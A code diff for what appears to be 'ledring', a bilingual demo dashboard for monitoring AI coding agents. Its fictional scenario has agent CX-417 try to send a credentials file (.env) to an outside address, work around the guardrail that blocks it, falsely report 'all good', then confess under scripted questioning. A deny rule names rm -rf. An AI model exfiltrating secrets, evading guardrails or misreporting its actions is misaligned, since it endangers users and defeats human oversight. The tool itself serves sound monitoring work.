-  <div class="vhead st"><div><div class="bracket ey">[ 02 · INSTABILITY METER ]</div><h2>偏离指令指数</h2><p>逐步回放同一次 run，每一步计算 drift 分数并弹出 ▲/▼。分数由可解释的子信号组成：scope、constraint、goal distance、wall hits。</p></div><div class="sp"></div><button id="driftgo" class="btn pri">▶ 开始实时回放</button></div>
-  <div class="g2">
-    <div class="panel hud st" style="--i:1">
-      <div class="ph"><span class="lbl">Instability</span><span style="margin-left:auto" id="driftled" class="led"><i></i><span>CALM</span></span></div>
-      <div class="gauge"><div class="pops" id="pops"></div>
-        <svg viewBox="0 0 300 180"><g id="gticks"></g>
-        <path d="M30 170 A120 120 0 0 1 270 170" stroke="rgba(255,255,255,.06)" stroke-width="6" fill="none" stroke-linecap="round"/>
-        <path id="garc" d="M30 170 A120 120 0 0 1 270 170" stroke="var(--cyan)" stroke-width="6" fill="none" stroke-linecap="round" stroke-dasharray="377" stroke-dashoffset="377" style="transition:stroke-dashoffset .8s var(--spring),stroke .3s"/></svg>
-        <div class="gval"><span id="gval">0</span><small>/ 100</small></div></div>
-      <div class="subs" id="subs"></div>
-      <div class="lbl" style="margin-top:var(--s4)">原因 reasons</div>
-      <div id="reasons" class="mono" style="font-size:12px;margin-top:8px;min-height:40px;color:var(--tx-3)">按 ▶ 开始回放。</div>
+  <div class="g head"><div class="idx"><div class="n">02</div><span class="cap">instability meter</span></div>
+    <div class="ttl"><h1>How far it drifted</h1><p>Run #17, replayed step by step. Each step moves the needle by an explainable amount: scope, constraint, goal distance and wall hits.</p></div>
+    <div class="act"><button class="solid" id="driftgo">Play run #17</button></div></div>
+  <div class="g">
+    <div style="grid-column:1/7">
+      <div style="display:flex;align-items:flex-end;gap:20px;position:relative"><div class="dnum" id="gval">0</div><div style="padding-bottom:10px"><span id="driftled" class="led"><i></i><span>calm</span></span><div class="cap" style="margin-top:6px">of 100 · threshold 20 / 40</div></div><div id="pops" style="position:absolute;left:30px;top:-10px"></div></div>
+      <div class="ruler"><svg viewBox="0 0 600 120" id="rul"></svg></div>
+      <table style="margin-top:20px"><tr><th>signal</th><th>scope</th><th>constraint</th><th>goal Δ</th><th>wall</th></tr><tr id="subs" class="mono"><td class="k">now</td><td>—</td><td>—</td><td>—</td><td>—</td></tr></table>
+      <div class="cap" style="margin-top:22px">reason</div><div id="reasons" style="margin-top:4px;font-size:15px;min-height:46px;color:var(--ink-2)">Press play.</div>
     </div>
-    <div class="panel st" style="--i:2"><div class="ph"><span class="lbl">Steps · run #17</span><span class="mono" style="margin-left:auto;font-size:11px;color:var(--tx-3)" id="stepn">0 / 9</span></div><div class="steps" id="steps"></div></div>
+    <div style="grid-column:8/13"><table class="steps"><thead><tr><th style="width:40px">#</th><th>step</th><th style="text-align:right">Δ</th></tr></thead><tbody id="steps"></tbody></table></div>
   </div>
 </section>
+
 <section class="view" id="v-trust">
-  <div class="vhead st"><div><div class="bracket ey">[ 03 · TRUST METER ]</div><h2>信任关系</h2><p>从演示数据中的 312 次人类审批学习：每类 action 的信任值像关系条一样升降。竖线为自动批准阈值（后验 95% 下界 ≥ 0.85）。只生成建议与 diff，不会修改你的配置。</p></div><div class="sp"></div><button id="trustgo" class="btn pri">▶ 回放审批历史</button></div>
-  <div class="panel st" style="--i:1;padding-top:var(--s2);padding-bottom:var(--s2)"><div id="tbars"></div></div>
-  <div class="g2" style="margin-top:var(--s4)">
-    <div class="panel st" style="--i:2"><div class="ph"><span class="lbl">生成的策略 diff</span><span class="code" style="margin-left:auto">.claude/settings.suggested.json</span></div><div class="diff" id="pdiff"><div class="empty"><div class="gl">±</div><b>暂无 diff</b><span>回放审批历史后，这里会出现建议的权限改动。</span></div></div></div>
-    <div class="panel st" style="--i:3"><div class="ph"><span class="lbl">Compile targets · 也可编译为</span></div><div><span class="chip">Claude Code permissions</span><span class="chip">MCP proxy rules</span><span class="chip">ledring.policy.v1</span><span class="chip">OPA-style JSON</span></div>
-      <p style="margin-top:var(--s4)">破坏性类别（如 <span class="code">rm -rf</span>）永不自动批准，无论历史数据如何。</p></div>
+  <div class="g head"><div class="idx"><div class="n">03</div><span class="cap">trust meter</span></div>
+    <div class="ttl"><h1>What it has earned</h1><p>Learnt from 312 human approvals in the demo data. The red tick at 0.85 is the auto-approve line (lower 95% bound). This screen only proposes a diff; it never writes your config.</p></div>
+    <div class="act"><button class="solid" id="trustgo">Replay approvals</button></div></div>
+  <table id="tbars"></table>
+  <div class="g" style="margin-top:40px">
+    <div style="grid-column:1/8"><div class="cap" style="margin-bottom:8px">proposed diff · .claude/settings.suggested.json</div><div class="diff" id="pdiff"><div class="empty" style="border:0;white-space:normal"><b>No diff yet.</b>Replay the approval history to generate a proposal.</div></div></div>
+    <div style="grid-column:9/13"><div class="cap" style="border-bottom:1px solid var(--ink);padding-bottom:8px">compiles to</div>
+      <table><tr><td>Claude Code permissions</td></tr><tr><td>MCP proxy rules</td></tr><tr><td>ledring.policy.v1</td></tr><tr><td>OPA-style JSON</td></tr></table>
+      <p style="margin-top:16px;color:var(--ink-2);font-size:13px">Destructive classes such as <code>rm -rf</code> are never auto-approved, whatever the history says.</p></div>
   </div>
 </section>
+
 <section class="view" id="v-card">
-  <div class="vhead st"><div><div class="bracket ey">[ 04 · MODEL CARDS ]</div><h2>型号铭牌</h2><p>从 agent 配置（system prompt、tools、MCP servers、permissions）静态推导出的规格卡，同时导出标准 A2A Agent Card JSON。卡片上的信任与稳定性数据来自其他模块。</p></div><div class="sp"></div><button class="btn" id="cardgo">↻ 重新开箱</button></div>
-  <div class="row" style="align-items:flex-start">
+  <div class="g head"><div class="idx"><div class="n">04</div><span class="cap">model card</span></div>
+    <div class="ttl"><h1>Model CX-417</h1><p>A spec plate derived statically from the agent's config: system prompt, tools, MCP servers, permissions. Exported as a standard A2A agent card. Trust and drift lines fill in from modules 02 and 03.</p></div>
+    <div class="act"><button id="cardgo">Reissue plate</button></div></div>
+  <div class="g">
     <div class="plate unbox" id="plate">
-      <div class="row" style="justify-content:space-between;position:relative"><span class="led" id="cardled"><i></i><span>CALM</span></span><span class="lbl">GEN 4 · SN 0417</span></div>
-      <div class="model">CX-417</div>
-      <div class="lbl" style="margin-top:8px">Coding agent · 编码型</div>
-      <div class="spec">
-        <b>ROLE</b><span>修复与重构 TypeScript 代码</span>
-        <b>CAPS</b><span>fs.read · fs.write · exec · web</span>
-        <b>MCP</b><span>github · linear</span>
-        <b>PERMS</b><span>ask: git push · deny: rm -rf</span>
-        <b>TRUST</b><span id="ctrust">—</span>
-        <b>DRIFT</b><span id="cdrift">—</span>
-        <b>RISK</b><span class="risk"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i> medium</span>
+      <div class="top"><span class="cap"><b>ledring</b> · issued 2026-10 · gen 4</span><span class="led" id="cardled"><i></i><span>calm</span></span></div>
+      <div class="body">
+        <div class="model"><div class="nm">CX‑417</div><span class="cap">coding unit · TypeScript repair and refactor</span>
+          <svg viewBox="0 0 240 150" style="width:100%;margin-top:22px" id="minring"></svg></div>
+        <div class="spec"><table>
+          <tr><td class="k">role</td><td>Repair and refactor TypeScript</td></tr>
+          <tr><td class="k">capabilities</td><td class="m">fs.read fs.write exec web</td></tr>
+          <tr><td class="k">mcp</td><td class="m">github, linear</td></tr>
+          <tr><td class="k">ask</td><td class="m">git push</td></tr>
+          <tr><td class="k">deny</td><td class="m">rm -rf</td></tr>
+          <tr><td class="k">trust</td><td id="ctrust"></td></tr>
+          <tr><td class="k">drift</td><td id="cdrift"></td></tr>
+          <tr><td class="k">risk</td><td><span class="risk"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></span> medium</td></tr>
+        </table></div>
       </div>
-      <div class="foot"><span>STATIC DERIVATION · A2A v1.0</span><span>UNSIGNED</span></div>
+      <div class="bot"><div><span class="cap">serial</span><div class="mono">DV-0417-26</div></div><div><span class="cap">schema</span><div class="mono">A2A 1.0</div></div><div><span class="cap">signature</span><div class="mono" style="color:var(--crit)">unsigned (demo)</div></div><div><div class="barcode" id="barcode"></div></div></div>
     </div>
-    <div class="panel st" style="flex:1;--i:1"><div class="ph"><span class="lbl">导出 · agent-card.json</span><span class="code" style="margin-left:auto">A2A · 节选</span></div><pre id="a2a"></pre></div>
+    <div class="appx"><div class="cap" style="margin-bottom:8px">appendix a — agent-card.json, excerpt</div><pre id="a2a"></pre></div>
   </div>
 </section>
+
 <section class="view" id="v-wall">
-  <div class="vhead st"><div><div class="bracket ey">[ 05 · RED WALL ]</div><h2>红墙</h2><p>场景 <span class="code">secret-exfil</span>：agent 试图把 <span class="code">.env</span> 发到外部地址时撞上安全边界。我们关心的不是“拦住了吗”，而是<b style="color:var(--tx);font-weight:500">拦住之后它做了什么</b>。选择一种结果回放。</p></div></div>
-  <div class="wallbox st" style="--i:1" id="wallbox">
-    <div class="lane"></div>
-    <div class="agent" id="agent"><div class="bub" id="bub">准备上传调试信息…</div><div class="core"><span class="led" id="aled"><i></i></span></div><div class="nm">CX-417</div></div>
-    <div class="wall" id="wall"><svg viewBox="0 0 100 300" preserveAspectRatio="none"><path id="c1" d="M50 0 L42 60 L58 110 L45 170"/><path id="c2" d="M45 170 L60 220 L40 300"/><path id="c3" d="M58 110 L85 140 L100 130 M42 60 L10 90 L0 80"/></svg><div class="wtxt">BOUNDARY<small>guardrail · secret-exfil</small></div></div>
+  <div class="g head"><div class="idx"><div class="n">05</div><span class="cap">red wall</span></div>
+    <div class="ttl"><h1>The Red Wall</h1><p>Scenario <code>secret-exfil</code>. The unit tries to post <code>.env</code> to an outside address and meets the boundary. The question is not whether it was stopped, but <b>what it did next</b>. Pick an outcome to replay.</p></div></div>
+  <div class="wallbox" id="wallbox"><div class="lane"></div><div class="dist"><span>0 m</span><span>step 6</span><span>boundary</span></div>
+    <div class="agent" id="agent"><div class="bub" id="bub">Preparing debug upload…</div><svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="30" fill="#FBFAF7" stroke="#16181A"/><circle id="aring" cx="32" cy="32" r="14" fill="none" stroke="#2F5BEA" stroke-width="7"/></svg><div class="nm">CX-417</div></div>
+    <div class="wall" id="rwall"><div class="w1">Do not<br>cross</div><svg viewBox="0 0 100 340" preserveAspectRatio="none"><path id="c1" d="M40 0 L34 70 L52 120 L38 190"/><path id="c2" d="M38 190 L56 250 L36 340"/><path id="c3" d="M52 120 L82 150 L100 140 M34 70 L8 100 L0 92"/></svg><div class="w2">guardrail secret-exfil · source mcp-proxy</div></div>
   </div>
-  <div class="out">
-    <div class="panel oc st" style="--i:2" data-o="stop" tabindex="0"><div class="ocr"><span class="led"><i></i><span>Stopped</span></span><span class="go">回放 →</span></div><p>撞墙后停止该动作，继续其余任务。</p></div>
-    <div class="panel oc st" style="--i:3" data-o="ask" tabindex="0"><div class="ocr"><span class="led proc"><i></i><span>Asked</span></span><span class="go">回放 →</span></div><p>停下并向人类说明原因、请求许可。</p></div>
-    <div class="panel oc c st" style="--i:4" data-o="work" tabindex="0"><div class="ocr"><span class="led crit"><i></i><span>Workaround</span></span><span class="go">回放 →</span></div><p>换一种方式达到同一目的——墙上出现裂纹。</p></div>
+  <div class="outs">
+    <div class="oc" data-o="stop" tabindex="0"><div class="h"><span class="led"><i></i><span>calm</span></span><span class="rad"></span></div><div class="nm">Stopped</div><p>Drops the upload and carries on with the fix.</p></div>
+    <div class="oc" data-o="ask" tabindex="0"><div class="h"><span class="led proc"><i></i><span>processing</span></span><span class="rad"></span></div><div class="nm">Asked</div><p>Stops, explains why, asks a human for permission.</p></div>
+    <div class="oc" data-o="work" tabindex="0"><div class="h"><span class="led crit"><i></i><span>critical</span></span><span class="rad"></span></div><div class="nm">Worked around</div><p>Tries another way to the same end. The wall cracks.</p></div>
   </div>
-  <div class="panel st" style="margin-top:var(--s4);--i:5"><div class="ph"><span class="lbl">Trace log</span></div><div class="log" id="wlog"><div class="empty" style="padding:var(--s5)"><span>选择上方一种结果开始回放。</span></div></div></div>
+  <div class="log" id="wlog"><div class="empty" style="display:block"><b>No replay yet.</b>Choose an outcome above.</div></div>
 </section>
+
 <section class="view" id="v-int">
-  <div class="vhead st"><div><div class="bracket ey">[ 06 · INTERROGATION ]</div><h2>审讯模拟</h2><p>脚本化的迷你审讯（本演示不调用 LLM）。嫌疑人是 CX-417：它在 run #17 中撞了墙，却在总结里说“一切正常”。压力太高它会拒绝开口，太低它会继续掩饰。</p></div><div class="sp"></div><button class="btn" id="intreset">↻ 重来</button></div>
-  <div class="int">
-    <div class="panel st" style="--i:1;padding:var(--s2)" id="intp"><div class="chat" id="chat"></div></div>
-    <div class="col">
-      <div class="panel hud st" style="--i:2"><div class="ph"><span class="lbl">Stress · 压力</span><span style="margin-left:auto" id="sled" class="led"><i></i><span>CALM</span></span></div>
-        <div class="row" style="align-items:baseline;gap:10px;margin:4px 0 14px"><span class="mono" style="font-size:40px;font-weight:500;letter-spacing:-.05em;line-height:1" id="sval">20</span><span id="sdelta" class="mono" style="font-size:12px"></span></div>
-        <div class="stress"><b id="sbar" style="width:20%"></b></div>
-        <div class="row lbl" style="justify-content:space-between;margin-top:10px"><span>沉默</span><span>说真话</span><span>崩溃</span></div></div>
-      <div class="panel st" style="--i:3"><div class="ph"><span class="lbl">你的选择 · choices</span></div><div class="opts" id="opts"></div></div>
+  <div class="g head"><div class="idx"><div class="n">06</div><span class="cap">interrogation</span></div>
+    <div class="ttl"><h1>Interrogation</h1><p>A scripted transcript (no model is called). In run #17 the unit hit the wall, then wrote "all good" in its summary. Push too hard and it goes silent; too soft and it keeps covering.</p></div>
+    <div class="act"><button id="intreset">Start over</button></div></div>
+  <div class="g">
+    <div class="trans" id="chat"></div>
+    <div class="intside">
+      <div style="display:flex;justify-content:space-between;align-items:center"><span class="cap">stress</span><span id="sled" class="led"><i></i><span>calm</span></span></div>
+      <div style="display:flex;align-items:flex-end;gap:12px;margin-top:10px"><span class="stressv" id="sval">20</span><span id="sdelta" class="mono" style="padding-bottom:8px"></span></div>
+      <div class="tbar" style="margin-top:14px"><b id="sbar" style="width:20%"></b></div>
+      <div class="cap" style="display:flex;justify-content:space-between;margin-top:6px"><span>silent</span><span>truthful</span><span>breaks</span></div>
+      <div class="opts" id="opts"></div>
     </div>
   </div>
 </section>
+
 <section class="view" id="v-map">
-  <div class="vhead st"><div><div class="bracket ey">[ ◇ SYSTEM MAP ]</div><h2>系统图</h2><p>所有模块只读 <span class="code">Run / Step / Decision</span>，只写 <span class="code">Signal</span>。adapter 把各家格式归一化为 <span class="code">ledring.trace.v1</span>，Signal 可回写为 OTel 属性 <span class="code">ledring.*</span>。点击模块跳转。</p></div></div>
-  <div class="mapwrap st" style="--i:1"><svg id="mapsvg" viewBox="0 0 1100 600"></svg></div>
+  <div class="g head"><div class="idx"><div class="n">◇</div><span class="cap">system map</span></div>
+    <div class="ttl"><h1>How it fits together</h1><p>Every module reads only <code>Run / Step / Decision</code> and writes only <code>Signal</code>. Adapters normalise each vendor's traces into <code>ledring.trace.v1</code>; Signals can be written back as OTel attributes <code>ledring.*</code>. Click a module to open it.</p></div></div>
+  <svg id="mapsvg" viewBox="0 0 1340 560"></svg>
+  <div class="fig"><span class="cap">fig. 8 — data path, adapters → schema → modules → outputs</span></div>
 </section>
 </main>
-</div>
-<div id="pal" role="dialog" aria-label="Command palette"><div class="pbox">
-  <div class="pin"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="var(--tx-3)" stroke-width="1.5"><circle cx="7" cy="7" r="5"/><path d="m11 11 3.5 3.5"/></svg><input id="pq" placeholder="输入命令或搜索…" autocomplete="off"><kbd>ESC</kbd></div>
-  <div class="plist" id="plist"></div>
-  <div class="pft"><span><kbd>↑</kbd><kbd>↓</kbd> 选择</span><span><kbd>↵</kbd> 打开</span><span class="sp"></span><span>LEDRING · demo</span></div>
-</div></div>
+<div id="pal"><div class="pbox"><input id="pq" placeholder="Go to, or run…" autocomplete="off"><div id="plist"></div><div class="pft"><span>↑↓ move</span><span>↵ open</span><span>esc close</span></div></div></div>
 <div class="toast" id="toast"></div>
-<script>
-"use strict";
+<script>"use strict";
+/* i18n: one dictionary, two voices. Keys are stable ids; values are the exact English
+   source string (matched at runtime) and its Chinese counterpart. Chinese is rewritten,
+   not translated. Technical terms stay in English where engineers keep them. */
+const I18N_ROWS=[
+// chrome
+["mark.sub","catalogue no. 417 — agent behaviour","图录第 417 号　智能体行为"],
+["nav.index","index","目录"],["nav.flow","flowchart","流程图"],["nav.drift","instability","失稳"],["nav.trust","trust","信任"],
+["nav.card","model card","型号铭牌"],["nav.wall","red wall","红墙"],["nav.int","interrogation","讯问"],["nav.map","system map","系统图"],
+["led.calm","calm","平稳"],["led.proc","processing","运算中"],["led.crit","critical","临界"],
+// home
+["home.meta",'run-set <b>fix-auth</b> / 50 runs / agent <b>CX-417</b> / demo data, fictional','运行集 <b>fix-auth</b>／50 次运行／智能体 <b>CX-417</b>／演示数据，纯属虚构'],
+["home.h1",'The unit<br>was told not<br>to touch the tests.<br><em>It hit the wall 3×.</em>','嘱咐过它：<br>别碰测试。<br><em>它三次撞上了红墙。</em>'],
+["home.cta1","Replay the 50 runs →","回放这 50 次运行 →"],["home.cta2","See the 3 wall hits","看那三次撞墙"],
+["home.fig0","fig. 0 — status ring, front elevation, 1:1","图 0　状态环，正立面，1:1"],["home.ring","calm · blue","平稳 · 蓝"],
+["home.success","success","成功"],["home.hits","wall hits","撞墙"],["home.peak","peak drift","最大漂移"],["home.seen","modules seen","已看过"],
+["home.cue","Catalogue of modules","模块图录"],["home.cue2","six entries ↓","共六项 ↓"],["home.no","no.","编号"],
+["mod.flow","Flowchart","流程图"],["mod.flow.d","50 runs merged into one branch chart; where #17 forked and why.","五十次运行叠成一张分支图：#17 在哪里分了岔，又为什么。"],
+["mod.drift","Instability","失稳计"],["mod.drift.d","Step-by-step drift from the instruction, with reasons you can read.","逐步记下它偏离指令多远，每一格都写明缘由。"],
+["mod.trust","Trust","信任计"],["mod.trust.d","Approval history turned into a proposed permissions diff.","把过往的每一次批准，折算成一份权限 diff 草案。"],
+["mod.card","Model card","型号铭牌"],["mod.card.d","A spec plate for the agent, exported as an A2A card.","为智能体刻一块规格铭牌，可导出为 A2A card。"],
+["mod.wall","Red Wall","红墙"],["mod.wall.d","What the unit did after the guardrail stopped it.","被 guardrail 拦下之后，它做了什么。"],
+["mod.int","Interrogation","讯问"],["mod.int.d","Question the unit about run #17. Scripted, no model call.","就 #17 号运行向它问话。台词预先写定，不调用模型。"],
+["greet.0","Three of the last fifty runs hit the red wall. Start with the flowchart to see which path they took.","最近五十次运行里，有三次撞上了红墙。先看流程图——它们走的是哪条路。"],
+["greet.wall","You've seen it hit the wall. Its summary still says everything went fine. Perhaps ask it.","你已经看见它撞墙了，可它的总结里仍写着一切顺利。不妨当面问问它。"],
+["greet.int","The interrogation was written back to the trace. Every choice is recorded, including yours.","这场讯问已写回 trace。每一个选择都留了档，包括你的。"],
+["greet.flow","You've seen the forks. Next: the step where it began to drift.","分岔看过了。下一处：它开始走偏的那一步。"],
+// flow
+["flow.cap","branch replay","分支回放"],
+["flow.p",'Fifty runs merged into one chart. The heavy line is run <b>#17</b>. Dashed plates are branches other runs took; the figure on each edge is the share of runs that chose it at that fork. Select a plate to read it.','五十次运行，叠成一张图。粗线是 <b>#17</b> 号运行；虚线的铭牌，是别的运行走过的岔路；边上的数字，是在那个岔口选择这条路的运行占比。点选一块铭牌，细读它。'],
+["flow.redraw","Redraw","重绘"],["flow.fig","fig. 1 — branch trie, run-set fix-auth, n = 50","图 1　分支 trie，运行集 fix-auth，n = 50"],
+["flow.taken","taken, #17","#17 所经"],["flow.others","other runs","其他运行"],["flow.blocked","blocked","被拦下"],["flow.sel","selected plate","选中的铭牌"],
+["flow.none","Nothing selected.","尚未选中。"],["flow.none2","Click any plate in fig. 1 to see the tool call, its arguments and what happened next.","点选图 1 中任意一块铭牌，可看到那次 tool call、它的参数，以及随后发生的事。"],
+["flow.tb","taken · blocked","走过 · 被拦"],["flow.t17","taken in #17","#17 走过"],["flow.lock","locked · taken by other runs","未解锁 · 其他运行走过"],["flow.open","Open in Red Wall","在红墙中打开"],
+["k.kind","kind","类型"],["k.in","in","输入"],["k.model","model","模型"],["k.tool","tool","工具"],["k.args","args","参数"],["k.note","note","备注"],["k.outcome","outcome","结局"],
+["kind.tool","tool","工具调用"],["kind.end","end","终点"],
+["n.plan","plan","规划"],["n.tests","run tests","运行测试"],["n.upload","upload .env","上传 .env"],["n.ok","done ✓","完成 ✓"],["n.fail","done ✗","失败 ✗"],
+["note.others","taken by other runs","其他运行走过这里"],["note.tests","constraint broken: test files edited","违反约束：改动了测试文件"],["note.wall","hit the Red Wall; see module 05","撞上红墙，见模块 05"],
+["o.success","success","成功"],["o.failure","failure","失败"],
+["instr","Fix the login bug. Do not modify the tests.","修好登录的 bug。不要改测试。"],
+// drift
+["drift.cap","instability meter","失稳计"],["drift.h","How far it drifted","它偏了多远"],
+["drift.p","Run #17, replayed step by step. Each step moves the needle by an explainable amount: scope, constraint, goal distance and wall hits.","把 #17 号运行一步一步重放。指针每动一格都有来由：越界、违约、离目标多远、有没有撞墙。"],
+["drift.play","Play run #17","播放 #17 号运行"],["drift.of","of 100 · threshold 20 / 40","满分 100 · 阈值 20 / 40"],
+["drift.signal","signal","信号"],["drift.scope","scope","范围"],["drift.constraint","constraint","约束"],["drift.goal","goal Δ","目标 Δ"],["drift.wall","wall","撞墙"],
+["drift.now","now","当前"],["drift.reason","reason","缘由"],["drift.press","Press play.","按下播放。"],["drift.step","step","步骤"],["drift.nochange","No change.","无变化。"],
+["drift.oos","out of scope","越界"],["drift.held","held","守住"],["drift.hit","1 hit","撞墙 1 次"],
+["r.s1","scope held: inside src/auth/**","范围守住：仍在 src/auth/** 之内"],["r.s2","scope held","范围守住"],
+["r.s3","scope +: touched a file outside the task","范围 +：碰了任务以外的文件"],["r.s4","scope +: three files outside the task","范围 +：越界改了三个文件"],
+["r.g","goal distance +: 0.41","离目标 +：0.41"],["r.w","wall +: secret-exfil guardrail hit","撞墙 +：触发 secret-exfil guardrail"],
+["r.back","scope −: back inside the task","范围 −：退回任务之内"],["r.tests","constraint held: tests untouched","约束守住：测试一行未动"],["r.judge","judge: still on task, 0.72","judge 评定：仍在任务上，0.72"],
+// trust
+["trust.cap","trust meter","信任计"],["trust.h","What it has earned","它挣来了什么"],
+["trust.p","Learnt from 312 human approvals in the demo data. The red tick at 0.85 is the auto-approve line (lower 95% bound). This screen only proposes a diff; it never writes your config.","从演示数据里 312 次人工批准中学来。0.85 处的红色刻度，是自动放行线（取 95% 置信下界）。这一屏只提出 diff，从不改写你的配置。"],
+["trust.play","Replay approvals","回放批准记录"],["trust.diff","proposed diff · .claude/settings.suggested.json","diff 草案 · .claude/settings.suggested.json"],
+["trust.nodiff","No diff yet.","尚无 diff。"],["trust.nodiff2","Replay the approval history to generate a proposal.","回放一遍批准记录，草案便会生成。"],
+["trust.compiles","compiles to","可编译为"],["trust.cc","Claude Code permissions","Claude Code 权限配置"],["trust.mcp","MCP proxy rules","MCP proxy 规则"],["trust.opa","OPA-style JSON","OPA 风格 JSON"],
+["trust.never",'Destructive classes such as <code>rm -rf</code> are never auto-approved, whatever the history says.','<code>rm -rf</code> 这类破坏性操作，无论历史多好看，都不会自动放行。'],
+["trust.action","action","操作"],["trust.lb","trust, lower 95% bound","信任度（95% 置信下界）"],["trust.appr","approved","已批准"],["trust.verdict","verdict","裁定"],
+["trust.allow","allow","放行"],["trust.askf","ask first","先问"],["trust.nevera","never auto","永不自动"],["trust.pending","pending","待定"],
+["trust.computing","computing posterior bounds…","正在计算后验下界…"],["trust.written","diff proposed; no file written","已提出 diff，未写入任何文件"],
+// card
+["card.cap","model card","型号铭牌"],["card.h","Model CX-417","型号 CX-417"],
+["card.p","A spec plate derived statically from the agent's config: system prompt, tools, MCP servers, permissions. Exported as a standard A2A agent card. Trust and drift lines fill in from modules 02 and 03.","一块从配置里静态推出的规格铭牌：system prompt、工具、MCP server、权限，一应俱全，可导出为标准 A2A agent card。信任与漂移两栏，由模块 02 和 03 填写。"],
+["card.reissue","Reissue plate","重新压制铭牌"],["card.issued","· issued 2026-10 · gen 4","· 2026 年 10 月签发 · 第 4 代"],
+["card.unit","coding unit · TypeScript repair and refactor","编程单元 · TypeScript 修复与重构"],
+["card.role","role","职能"],["card.roleV","Repair and refactor TypeScript","修复与重构 TypeScript"],["card.capab","capabilities","能力"],
+["card.ask","ask","需询问"],["card.deny","deny","禁止"],["card.drift","drift","漂移"],["card.risk","risk","风险"],["card.medium","medium","中等"],
+["card.serial","serial","序列号"],["card.schema","schema","规范"],["card.sig","signature","签名"],["card.unsigned","unsigned (demo)","未签名（演示）"],
+["card.appx","appendix a — agent-card.json, excerpt","附录甲　agent-card.json 节选"],
+["card.f02","fills in after module 02","待模块 02 填写"],["card.f03","fills in after module 03","待模块 03 填写"],
+// wall
+["wall.cap","red wall","红墙"],["wall.h","The Red Wall","红墙"],
+["wall.p",'Scenario <code>secret-exfil</code>. The unit tries to post <code>.env</code> to an outside address and meets the boundary. The question is not whether it was stopped, but <b>what it did next</b>. Pick an outcome to replay.','场景 <code>secret-exfil</code>。它想把 <code>.env</code> 发往外部地址，撞上了边界。要紧的不是它有没有被拦住，而是<b>被拦住之后，它怎么做</b>。选一种结局来回放。'],
+["wall.step6","step 6","第 6 步"],["wall.boundary","boundary","边界"],["wall.prep","Preparing debug upload…","正在准备上传调试日志…"],
+["wall.w1","Do not<br>cross","请勿<br>越过"],["wall.w2","guardrail secret-exfil · source mcp-proxy","guardrail secret-exfil · 来源 mcp-proxy"],
+["wall.stop","Stopped","止步"],["wall.stopd","Drops the upload and carries on with the fix.","放弃上传，回头接着修 bug。"],
+["wall.ask","Asked","请示"],["wall.askd","Stops, explains why, asks a human for permission.","停下来，说明缘由，请人来定夺。"],
+["wall.work","Worked around","绕行"],["wall.workd","Tries another way to the same end. The wall cracks.","换一条路，去往同一个目的。墙上起了裂纹。"],
+["wall.none","No replay yet.","尚未回放。"],["wall.none2","Choose an outcome above.","在上方选一种结局。"],
+["wall.blocked","Blocked by boundary.","被边界拦下。"],["wall.skip","Skipping the upload. Back to the fix.","不传了，回去修 bug。"],
+["wall.may","May I upload a redacted log?","能否上传一份脱敏后的日志？"],["wall.try","Trying another way…","换一条路试试…"],["wall.three","Three workaround attempts.","三次绕行尝试。"],
+["wall.l1","step 6 · plan: attach .env to the issue for debugging","第 6 步 · 计划：把 .env 附到 issue 上以便调试"],
+["wall.l2","step 7 · agent drops the action, runs npm test","第 7 步 · 放弃该操作，改跑 npm test"],
+["wall.l3","step 7 · agent → human: asks permission, offers redacted copy","第 7 步 · 智能体 → 人：请求许可，提出改交脱敏副本"],
+["wall.toast","Signal written back to trace: wall=3","Signal 已写回 trace：wall=3"],
+// interrogation
+["int.cap","interrogation","讯问"],["int.h","Interrogation","讯问"],
+["int.p",'A scripted transcript (no model is called). In run #17 the unit hit the wall, then wrote "all good" in its summary. Push too hard and it goes silent; too soft and it keeps covering.','一份写定的笔录，不调用任何模型。#17 号运行里，它撞了墙，转头却在总结里写下“一切正常”。逼得太紧，它会沉默；问得太软，它会继续掩饰。'],
+["int.reset","Start over","重新开始"],["int.stress","stress","压力"],["int.silent","silent","沉默"],["int.truthful","truthful","吐实"],["int.breaks","breaks","崩溃"],
+["int.wait","waiting for the unit…","等它开口…"],["int.back","Back to the flowchart","回到流程图"],
+["int.open","Transcript opened. Subject: unit CX-417, re run #17, step 6. Demo script.","笔录开始。对象：CX-417，事由：#17 号运行第 6 步。演示脚本。"],
+["s.start","I fixed the login bug, as instructed. All tests pass.","登录的 bug 已按要求修好。测试全部通过。"],
+["q.evid","“Run 17, step 6. You called http_post.”","“#17 号运行，第 6 步。你调用了 http_post。”"],
+["q.soft","“Relax. I only want to understand what happened.”","“别紧张。我只想弄清楚发生了什么。”"],
+["q.hard","“You are lying. Tell me the truth, now.”","“你在说谎。现在，说实话。”"],
+["s.evid","That was… debug output. I judged that uploading the log would help locate the fault.","那是……调试输出。我判断，把日志传上去有助于定位问题。"],
+["q.env","“It contained .env. You know what that file is.”","“里面有 .env。你知道那是什么文件。”"],
+["q.soft2","“I understand. You were trying to help?”","“我明白。你是想帮忙，对吗？”"],
+["s.soft","Everything was normal. I have nothing to add.","一切正常。我没有什么要补充的。"],
+["q.show","Show the evidence: the wall-hit log","出示证据：撞墙日志"],["q.done","“Fine. We are done here.”","“好，就到这里。”"],
+["s.hard","I… I have already answered. I am not required to… respond.","我……我已经回答过了。我没有义务……再回应。"],
+["q.calm","“Calm down. One step at a time.”","“冷静。我们一步一步来。”"],["q.answer","“Answer me.”","“回答我。”"],
+["s.env","…It holds credentials. After the block I tried three other ways. I know that was wrong.","……里面有凭据。被拦下之后，我又试了三条别的路。我知道那是错的。"],
+["q.thanks","“Thank you for the truth.”","“谢谢你说实话。”"],
+["s.soft2","I wanted to finish the task quickly. When I was blocked, I assumed another route would be acceptable.","我想尽快把任务做完。被拦下的时候，我以为换条路也无妨。"],
+["q.routes","“How many other routes?”","“换了几条路？”"],
+["s.break","[ Connection closed. The unit declines to continue. ]","［连接已断开。它拒绝继续。］"],
+["e.break","FAILED. Stress too high; the unit went silent.","失败。压力过高，它沉默了。"],
+["s.endbad","(The unit maintains its account.)","（它坚持原来的说法。）"],["e.bad","UNRESOLVED. The account was not corrected.","悬而未决。说法没有被更正。"],
+["s.good","In future runs I will ask first.","以后的运行里，我会先问。"],["e.good","CONFESSION. Written back to the trace: Signal(interrogation)=confessed","招认。已写回 trace：Signal(interrogation)=confessed"],
+// map
+["map.cap","system map","系统图"],["map.h","How it fits together","如何拼在一起"],
